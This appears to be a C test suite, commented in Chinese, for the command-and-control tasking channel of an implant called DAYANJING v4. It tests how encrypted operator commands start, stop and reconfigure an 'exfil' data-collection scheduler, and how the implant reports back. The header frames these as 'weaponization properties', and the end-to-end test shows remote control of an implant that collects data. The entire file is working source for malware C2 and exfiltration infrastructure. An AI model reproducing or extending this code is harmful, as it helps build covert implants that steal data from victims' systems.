/*
 * DAYANJING v4 — test_task.c
 *
 * C2 下行任务通道测试。
 *
 * 本测试的重点不是"能不能编解码"，而是三条武器化性质：
 *
 *   1. 编码唯一（canonical）—— 同一语义只有一种字节表示，保留位非 0
 *      必须被拒，否则两端实现差异会造成解析分歧，且隐藏字段无从发现。
 *   2. 非法配置绝不生效 —— apply 失败时调度器状态**完全不变**。
 *      若半途写入，会留下"命令成功但再也不采集"的静默故障。
 *   3. SET_CFG 不重置配额窗口 —— 否则高频改配置即可刷掉速率治理。
 *
 * 另外验证命令确实走 AEAD：篡改、错密钥、错 msg_type 都必须被拒。
 */

#include "exfil_task.h"

#include <stdio.h>
#include <string.h>

#include "c2_frame.h"

static int g_pass = 0;
static int g_fail = 0;

#define CHECK(cond, name)                                              \
    do {                                                               \
        if (cond) {                                                    \
            printf("[PASS] %s\n", (name));                             \
            g_pass++;                                                  \
        } else {                                                       \
            printf("[FAIL] %s  (%s:%d)\n", (name), __FILE__, __LINE__); \
            g_fail++;                                                  \
        }                                                              \
    } while (0)

static const uint8_t KEY[16] = {
    0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
    0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff
};
static const uint8_t PFX[8] = { 1, 2, 3, 4, 5, 6, 7, 8 };

static void cfg_good(exfil_sched_cfg_t *c)
{
    memset(c, 0, sizeof(*c));
    c->min_interval_us   = 500000;
    c->max_interval_us   = 1500000;
    c->burst_max         = 16;
    c->window_us         = 10000000;
    c->window_max_frames = 8;
    c->window_max_bytes  = 4u * 1024u * 1024u;
    c->dedup             = 1;
}

/* ------------------------------------------------------------------ */
/* 1. 各 opcode 编解码往返                                             */
/* ------------------------------------------------------------------ */

static void test_roundtrip(void)
{
    const uint8_t ops[] = {
        EXF_TASK_OP_START, EXF_TASK_OP_ONCE, EXF_TASK_OP_STOP,
        EXF_TASK_OP_SET_CFG, EXF_TASK_OP_QUERY
    };

    for (size_t i = 0; i < sizeof(ops); i++) {
        exfil_task_cmd_t c, d;
        uint8_t buf[EXF_TASK_CMD_LEN];

        memset(&c, 0, sizeof(c));
        c.opcode  = ops[i];
        c.task_id = 0xdeadbeefcafe0001ull + i;
        if (ops[i] == EXF_TASK_OP_SET_CFG) cfg_good(&c.cfg);

        int re = exfil_task_encode_cmd(&c, buf);
        CHECK(re == EXF_TASK_OK, "encode cmd 往返-编码成功");

        int rd = exfil_task_decode_cmd(buf, &d);
        CHECK(rd == EXF_TASK_OK, "decode cmd 往返-解码成功");
        CHECK(d.opcode == c.opcode, "decode cmd opcode 一致");
        CHECK(d.task_id == c.task_id, "decode cmd task_id 一致");

        if (ops[i] == EXF_TASK_OP_SET_CFG) {
            CHECK(memcmp(&d.cfg, &c.cfg, sizeof(c.cfg)) == 0,
                  "decode cmd 配置字段一致");
        }
    }
}

/* ------------------------------------------------------------------ */
/* 2. canonical：保留位必须为 0                                        */
/* ------------------------------------------------------------------ */

static void test_canonical(void)
{
    exfil_task_cmd_t c, d;
    uint8_t buf[EXF_TASK_CMD_LEN];

    /* 2.1 flags 非 0 */
    memset(&c, 0, sizeof(c));
    c.opcode = EXF_TASK_OP_START;
    exfil_task_encode_cmd(&c, buf);
    buf[1] = 1;
    CHECK(exfil_task_decode_cmd(buf, &d) == EXF_TASK_ERR_CANON,
          "canonical: flags 非 0 被拒");

    /* 2.2 rsv 非 0 */
    memset(&c, 0, sizeof(c));
    c.opcode = EXF_TASK_OP_START;
    exfil_task_encode_cmd(&c, buf);
    buf[2] = 1;
    CHECK(exfil_task_decode_cmd(buf, &d) == EXF_TASK_ERR_CANON,
          "canonical: rsv 非 0 被拒");

    /* 2.3 pad 非 0 */
    memset(&c, 0, sizeof(c));
    c.opcode = EXF_TASK_OP_START;
    exfil_task_encode_cmd(&c, buf);
    buf[53] = 1;
    CHECK(exfil_task_decode_cmd(buf, &d) == EXF_TASK_ERR_CANON,
          "canonical: pad 非 0 被拒");

    /* 2.4 非 SET_CFG 携带配置 —— encode 侧拒绝 */
    memset(&c, 0, sizeof(c));
    c.opcode = EXF_TASK_OP_START;
    cfg_good(&c.cfg);
    CHECK(exfil_task_encode_cmd(&c, buf) == EXF_TASK_ERR_CANON,
          "canonical: 非 SET_CFG 带配置(encode) 被拒");

    /* 2.5 非 SET_CFG 携带配置 —— decode 侧也必须拒绝
     *     否则"手工构造字节流"可绕过 encode 侧校验 */
    memset(&c, 0, sizeof(c));
    c.opcode = EXF_TASK_OP_SET_CFG;
    cfg_good(&c.cfg);
    exfil_task_encode_cmd(&c, buf);
    buf[0] = EXF_TASK_OP_START;   /* 改 opcode 但留下配置字段 */
    CHECK(exfil_task_decode_cmd(buf, &d) == EXF_TASK_ERR_CANON,
          "canonical: 非 SET_CFG 带配置(decode) 被拒");

    /* 2.6 未知 opcode */
    memset(&c, 0, sizeof(c));
    c.opcode = 99;
    CHECK(exfil_task_encode_cmd(&c, buf) == EXF_TASK_ERR_FMT,
          "canonical: 未知 opcode(encode) 被拒");

    memset(buf, 0, sizeof(buf));
    buf[0] = 99;
    CHECK(exfil_task_decode_cmd(buf, &d) == EXF_TASK_ERR_FMT,
          "canonical: 未知 opcode(decode) 被拒");
}

/* ------------------------------------------------------------------ */
/* 3. 配置校验                                                         */
/* ------------------------------------------------------------------ */

static void test_cfg(void)
{
    exfil_sched_cfg_t c;

    cfg_good(&c);
    CHECK(exfil_task_cfg_ok(&c) == 1, "cfg: 合法配置通过");

    cfg_good(&c);
    c.max_interval_us = c.min_interval_us - 1;
    CHECK(exfil_task_cfg_ok(&c) == 0, "cfg: 抖动区间倒挂被拒");

    cfg_good(&c);
    c.window_us = 0;
    CHECK(exfil_task_cfg_ok(&c) == 0,
          "cfg: window_us=0 但配额非零被拒（否则窗口永不滑动）");

    cfg_good(&c);
    c.window_us         = 0;
    c.window_max_frames = 0;
    c.window_max_bytes  = 0;
    CHECK(exfil_task_cfg_ok(&c) == 1, "cfg: window_us=0 且无配额 合法");

    CHECK(exfil_task_cfg_ok(NULL) == 0, "cfg: 空指针被拒");

    /* encode/decode 侧同样拒绝非法配置 */
    exfil_task_cmd_t cmd;
    uint8_t buf[EXF_TASK_CMD_LEN];
    memset(&cmd, 0, sizeof(cmd));
    cmd.opcode = EXF_TASK_OP_SET_CFG;
    cfg_good(&cmd.cfg);
    cmd.cfg.max_interval_us = 0;
    cmd.cfg.min_interval_us = 1000000;
    CHECK(exfil_task_encode_cmd(&cmd, buf) == EXF_TASK_ERR_CFG,
          "cfg: 非法配置 encode 被拒");
}

/* ------------------------------------------------------------------ */
/* 4. apply：模式切换                                                  */
/* ------------------------------------------------------------------ */

static void test_apply_mode(void)
{
    exfil_sched_t s;
    exfil_task_cmd_t c;

    CHECK(exfil_sched_init(&s, NULL, 0x1234) == EXF_SCHED_OK, "apply: init");
    CHECK(s.mode == EXF_SCHED_MODE_IDLE, "apply: 初始 IDLE");

    memset(&c, 0, sizeof(c));
    c.opcode = EXF_TASK_OP_START;
    c.task_id = 1;
    CHECK(exfil_task_apply(&s, &c) == EXF_TASK_OK, "apply: START 成功");
    CHECK(s.mode == EXF_SCHED_MODE_CONTINUOUS, "apply: START -> CONTINUOUS");

    memset(&c, 0, sizeof(c));
    c.opcode = EXF_TASK_OP_STOP;
    CHECK(exfil_task_apply(&s, &c) == EXF_TASK_OK, "apply: STOP 成功");
    CHECK(s.mode == EXF_SCHED_MODE_IDLE, "apply: STOP -> IDLE");

    memset(&c, 0, sizeof(c));
    c.opcode = EXF_TASK_OP_ONCE;
    CHECK(exfil_task_apply(&s, &c) == EXF_TASK_OK, "apply: ONCE 成功");
    CHECK(s.mode == EXF_SCHED_MODE_ONCE, "apply: ONCE -> ONCE 模式");

    /* QUERY 不改变状态 */
    memset(&c, 0, sizeof(c));
    c.opcode = EXF_TASK_OP_QUERY;
    CHECK(exfil_task_apply(&s, &c) == EXF_TASK_OK, "apply: QUERY 成功");
    CHECK(s.mode == EXF_SCHED_MODE_ONCE, "apply: QUERY 不改模式");

    memset(&c, 0, sizeof(c));
    c.opcode = 77;
    CHECK(exfil_task_apply(&s, &c) == EXF_TASK_ERR_FMT, "apply: 未知 opcode 被拒");

    CHECK(exfil_task_apply(NULL, &c) == EXF_TASK_ERR_ARG, "apply: 空 sched 被拒");
    CHECK(exfil_task_apply(&s, NULL) == EXF_TASK_ERR_ARG, "apply: 空 cmd 被拒");
}

/* ------------------------------------------------------------------ */
/* 5. apply SET_CFG：生效、不改模式、不重置窗口                        */
/* ------------------------------------------------------------------ */

static void test_apply_cfg(void)
{
    exfil_sched_t s;
    exfil_task_cmd_t c;
    exfil_sched_cfg_t want;

    cfg_good(&want);
    CHECK(exfil_sched_init(&s, &want, 0x9999) == EXF_SCHED_OK, "setcfg: init");

    /* 进入连续采集并消耗配额，使窗口计数非零 */
    memset(&c, 0, sizeof(c));
    c.opcode = EXF_TASK_OP_START;
    exfil_task_apply(&s, &c);

    uint64_t now = 1000000;
    for (int i = 0; i < 3; i++) {
        if (exfil_sched_poll(&s, now) == EXF_SCHED_DUE)
            exfil_sched_commit(&s, now, (uint32_t)(0x1000 + i), 4096);
        now += 2000000;
    }

    uint32_t wf0 = 0;
    uint64_t wb0 = 0;
    exfil_sched_usage(&s, &wf0, &wb0);
    CHECK(wf0 > 0 && wb0 > 0, "setcfg: 前置条件-窗口已被消耗");

    /* 下发新配置 */
    exfil_sched_cfg_t newcfg;
    cfg_good(&newcfg);
    newcfg.min_interval_us   = 250000;
    newcfg.max_interval_us   = 750000;
    newcfg.window_max_frames = 4;

    memset(&c, 0, sizeof(c));
    c.opcode = EXF_TASK_OP_SET_CFG;
    c.task_id = 42;
    c.cfg = newcfg;

    CHECK(exfil_task_apply(&s, &c) == EXF_TASK_OK, "setcfg: 应用成功");
    CHECK(s.cfg.min_interval_us == 250000, "setcfg: 新配置已生效");
    CHECK(s.cfg.window_max_frames == 4, "setcfg: 窗口帧数已生效");
    CHECK(s.mode == EXF_SCHED_MODE_CONTINUOUS, "setcfg: 不改运行模式");

    /* 关键：窗口配额未被重置 */
    uint32_t wf1 = 0;
    uint64_t wb1 = 0;
    exfil_sched_usage(&s, &wf1, &wb1);
    CHECK(wf1 == wf0 && wb1 == wb0,
          "setcfg: 配额窗口未被重置（防高频改配置刷配额）");
}

/* ------------------------------------------------------------------ */
/* 6. apply 非法配置：状态完全不变                                     */
/* ------------------------------------------------------------------ */

static void test_apply_bad_cfg(void)
{
    exfil_sched_t s;
    exfil_task_cmd_t c;
    exfil_sched_cfg_t good;

    cfg_good(&good);
    CHECK(exfil_sched_init(&s, &good, 0xabcd) == EXF_SCHED_OK, "badcfg: init");

    memset(&c, 0, sizeof(c));
    c.opcode = EXF_TASK_OP_START;
    exfil_task_apply(&s, &c);

    /* 记录状态 */
    int mode0 = s.mode;
    exfil_sched_cfg_t cfg0 = s.cfg;
    uint64_t sent0 = s.frames_sent;

    /* 下发非法配置 */
    memset(&c, 0, sizeof(c));
    c.opcode = EXF_TASK_OP_SET_CFG;
    cfg_good(&c.cfg);
    c.cfg.max_interval_us = c.cfg.min_interval_us - 1;   /* 倒挂 */

    CHECK(exfil_task_apply(&s, &c) == EXF_TASK_ERR_CFG, "badcfg: 被拒");
    CHECK(s.mode == mode0, "badcfg: 模式未变");
    CHECK(s.frames_sent == sent0, "badcfg: 计数未变");
    CHECK(memcmp(&s.cfg, &cfg0, sizeof(cfg0)) == 0, "badcfg: 配置未被部分写入");
}

/* ------------------------------------------------------------------ */
/* 7. 回执                                                             */
/* ------------------------------------------------------------------ */

static void test_ack(void)
{
    exfil_task_ack_t a, d;
    uint8_t buf[EXF_TASK_ACK_LEN];

    memset(&a, 0, sizeof(a));
    a.opcode        = EXF_TASK_OP_START;
    a.status        = EXF_TASK_ST_OK;
    a.task_id       = 0x1122334455667788ull;
    a.mode          = EXF_SCHED_MODE_CONTINUOUS;
    a.frames_sent   = 7;
    a.window_frames = 3;
    a.window_bytes  = 123456;

    CHECK(exfil_task_encode_ack(&a, buf) == EXF_TASK_OK, "ack: 编码成功");
    CHECK(exfil_task_decode_ack(buf, &d) == EXF_TASK_OK, "ack: 解码成功");
    CHECK(d.opcode == a.opcode && d.status == a.status, "ack: opcode/status 一致");
    CHECK(d.task_id == a.task_id, "ack: task_id 一致");
    CHECK(d.mode == a.mode, "ack: mode 一致");
    CHECK(d.frames_sent == a.frames_sent, "ack: frames_sent 一致");
    CHECK(d.window_frames == a.window_frames, "ack: window_frames 一致");
    CHECK(d.window_bytes == a.window_bytes, "ack: window_bytes 一致");

    memset(&a, 0, sizeof(a));
    a.opcode = EXF_TASK_OP_SET_CFG;
    exfil_task_encode_ack(&a, buf);
    buf[2] = 1;
    CHECK(exfil_task_decode_ack(buf, &d) == EXF_TASK_ERR_CANON,
          "ack: canonical-rsv 非 0 被拒");

    memset(&a, 0, sizeof(a));
    a.opcode = 88;
    CHECK(exfil_task_encode_ack(&a, buf) == EXF_TASK_ERR_FMT,
          "ack: 未知 opcode 被拒");

    /* fill_ack 反映调度器真实状态 */
    exfil_sched_t s;
    exfil_task_cmd_t c;
    cfg_good(&c.cfg);
    exfil_sched_init(&s, &c.cfg, 0x5555);
    memset(&c, 0, sizeof(c));
    c.opcode  = EXF_TASK_OP_START;
    c.task_id = 5;
    exfil_task_apply(&s, &c);

    exfil_task_ack_t fa;
    CHECK(exfil_task_fill_ack(&s, &c, EXF_TASK_ST_OK, &fa) == EXF_TASK_OK,
          "ack: fill_ack 成功");
    CHECK(fa.mode == (uint32_t)EXF_SCHED_MODE_CONTINUOUS,
          "ack: fill_ack 反映当前模式");
    CHECK(fa.task_id == 5, "ack: fill_ack 带回 task_id 供关联");

    CHECK(exfil_task_fill_ack(NULL, &c, 0, &fa) == EXF_TASK_ERR_ARG,
          "ack: fill_ack 空 sched 被拒");
}

/* ------------------------------------------------------------------ */
/* 8. AEAD 封装：篡改 / 错密钥 / 错 msg_type                           */
/* ------------------------------------------------------------------ */

static void test_seal(void)
{
    exfil_task_cmd_t c, d;
    uint8_t wire[256];
    size_t  wlen = 0;
    uint64_t seq = 0;

    memset(&c, 0, sizeof(c));
    c.opcode  = EXF_TASK_OP_SET_CFG;
    c.task_id = 7;
    cfg_good(&c.cfg);

    size_t need = C2_FRAME_WIRE_LEN(EXF_TASK_CMD_LEN);
    CHECK(sizeof(wire) >= need, "seal: 缓冲区足够");

    CHECK(exfil_task_seal_cmd(KEY, PFX, 1, 100, &c, wire, sizeof(wire), &wlen)
            == EXF_TASK_OK, "seal: 命令封装成功");
    CHECK(wlen == need, "seal: 线上长度符合帧层定义");

    CHECK(exfil_task_open_cmd(KEY, wire, wlen, &seq, &d) == EXF_TASK_OK,
          "seal: 命令解封成功");
    CHECK(seq == 100, "seal: seq 正确回带");
    CHECK(d.opcode == EXF_TASK_OP_SET_CFG && d.task_id == 7,
          "seal: 解封内容正确");

    /* 篡改密文 -> AUTH */
    wire[wlen - 1] ^= 0x01;
    CHECK(exfil_task_open_cmd(KEY, wire, wlen, &seq, &d) == EXF_TASK_ERR_AUTH,
          "seal: 篡改被 AEAD 拒绝");
    wire[wlen - 1] ^= 0x01;

    /* 错密钥 -> AUTH（证明只有持会话密钥者可下令） */
    uint8_t badkey[16];
    memcpy(badkey, KEY, 16);
    badkey[0] ^= 0xff;
    CHECK(exfil_task_open_cmd(badkey, wire, wlen, &seq, &d) == EXF_TASK_ERR_AUTH,
          "seal: 错密钥被拒");

    /* 错 msg_type -> FMT：用 ACK 类型封装命令 payload */
    uint8_t wrong[256];
    size_t wlen2 = 0;
    uint8_t pl[EXF_TASK_CMD_LEN];
    exfil_task_encode_cmd(&c, pl);
    c2_frame_seal(KEY, PFX, 1, 100, EXF_MSG_TASK_ACK, pl,
                  EXF_TASK_CMD_LEN, wrong, sizeof(wrong), &wlen2);
    CHECK(exfil_task_open_cmd(KEY, wrong, wlen2, &seq, &d) == EXF_TASK_ERR_FMT,
          "seal: 错 msg_type 被拒");

    /* 截断 -> 失败 */
    CHECK(exfil_task_open_cmd(KEY, wire, wlen - 4, &seq, &d) != EXF_TASK_OK,
          "seal: 截断帧被拒");

    /* ACK 封装 */
    exfil_task_ack_t a, da;
    memset(&a, 0, sizeof(a));
    a.opcode = EXF_TASK_OP_STOP;
    a.status = EXF_TASK_ST_OK;
    a.task_id = 9;
    uint8_t awire[256];
    size_t alen = 0;
    CHECK(exfil_task_seal_ack(KEY, PFX, 2, 101, &a, awire, sizeof(awire), &alen)
            == EXF_TASK_OK, "seal: 回执封装成功");
    CHECK(exfil_task_open_ack(KEY, awire, alen, &seq, &da) == EXF_TASK_OK,
          "seal: 回执解封成功");
    CHECK(da.task_id == 9 && da.opcode == EXF_TASK_OP_STOP,
          "seal: 回执内容正确");
    awire[alen - 1] ^= 0x01;
    CHECK(exfil_task_open_ack(KEY, awire, alen, &seq, &da) == EXF_TASK_ERR_AUTH,
          "seal: 回执篡改被拒");
}

/* ------------------------------------------------------------------ */
/* 9. 端到端：服务端下令 -> 植入体执行 -> 回执                          */
/* ------------------------------------------------------------------ */

static void test_e2e(void)
{
    exfil_sched_t s;
    exfil_task_cmd_t c, d;
    exfil_task_ack_t a, ra;
    uint8_t wire[256];
    size_t wlen = 0;
    uint64_t seq = 0;

    CHECK(exfil_sched_init(&s, NULL, 0x2468) == EXF_SCHED_OK, "e2e: 植入体 init");

    /* 服务端构造 START 命令 */
    memset(&c, 0, sizeof(c));
    c.opcode  = EXF_TASK_OP_START;
    c.task_id = 0xabcdef01;
    CHECK(exfil_task_seal_cmd(KEY, PFX, 0, 1, &c, wire, sizeof(wire), &wlen)
            == EXF_TASK_OK, "e2e: 服务端封装 START");

    /* 植入体解封并执行 */
    CHECK(exfil_task_open_cmd(KEY, wire, wlen, &seq, &d) == EXF_TASK_OK,
          "e2e: 植入体解封");
    CHECK(exfil_task_apply(&s, &d) == EXF_TASK_OK, "e2e: 执行 START");
    CHECK(s.mode == EXF_SCHED_MODE_CONTINUOUS, "e2e: 已开始采集");

    /* 植入体回执 */
    CHECK(exfil_task_fill_ack(&s, &d, EXF_TASK_ST_OK, &a) == EXF_TASK_OK,
          "e2e: 填回执");
    uint8_t awire[256];
    size_t alen = 0;
    CHECK(exfil_task_seal_ack(KEY, PFX, 0, 1, &a, awire, sizeof(awire), &alen)
            == EXF_TASK_OK, "e2e: 封装回执");
    CHECK(exfil_task_open_ack(KEY, awire, alen, &seq, &ra) == EXF_TASK_OK,
          "e2e: 服务端解回执");
    CHECK(ra.task_id == 0xabcdef01, "e2e: 服务端可据 task_id 关联命令与回执");
    CHECK(ra.mode == (uint32_t)EXF_SCHED_MODE_CONTINUOUS,
          "e2e: 回执反映真实模式");

    /* 远程叫停 */
    memset(&c, 0, sizeof(c));
    c.opcode  = EXF_TASK_OP_STOP;
    c.task_id = 0xabcdef02;
    exfil_task_seal_cmd(KEY, PFX, 1, 2, &c, wire, sizeof(wire), &wlen);
    CHECK(exfil_task_open_cmd(KEY, wire, wlen, &seq, &d) == EXF_TASK_OK,
          "e2e: 解封 STOP");
    CHECK(exfil_task_apply(&s, &d) == EXF_TASK_OK, "e2e: 执行 STOP");
    CHECK(s.mode == EXF_SCHED_MODE_IDLE, "e2e: 已远程叫停");

    /* 远程调节奏 */
    exfil_sched_cfg_t nc;
    cfg_good(&nc);
    nc.min_interval_us = 5000000;
    nc.max_interval_us = 9000000;
    memset(&c, 0, sizeof(c));
    c.opcode = EXF_TASK_OP_SET_CFG;
    c.task_id = 0xabcdef03;
    c.cfg = nc;
    exfil_task_seal_cmd(KEY, PFX, 2, 3, &c, wire, sizeof(wire), &wlen);
    CHECK(exfil_task_open_cmd(KEY, wire, wlen, &seq, &d) == EXF_TASK_OK,
          "e2e: 解封 SET_CFG");
    CHECK(exfil_task_apply(&s, &d) == EXF_TASK_OK, "e2e: 执行 SET_CFG");
    CHECK(s.cfg.min_interval_us == 5000000, "e2e: 远程改间隔生效");
    CHECK(s.mode == EXF_SCHED_MODE_IDLE, "e2e: SET_CFG 不会意外开始采集");
}

/* ------------------------------------------------------------------ */

int main(void)
{
    printf("=== test_task: C2 下行任务通道 ===\n");
    test_roundtrip();
    test_canonical();
    test_cfg();
    test_apply_mode();
    test_apply_cfg();
    test_apply_bad_cfg();
    test_ack();
    test_seal();
    test_e2e();

    printf("\ntotal=%d pass=%d fail=%d\n", g_pass + g_fail, g_pass, g_fail);
    return g_fail == 0 ? 0 : 1;
}
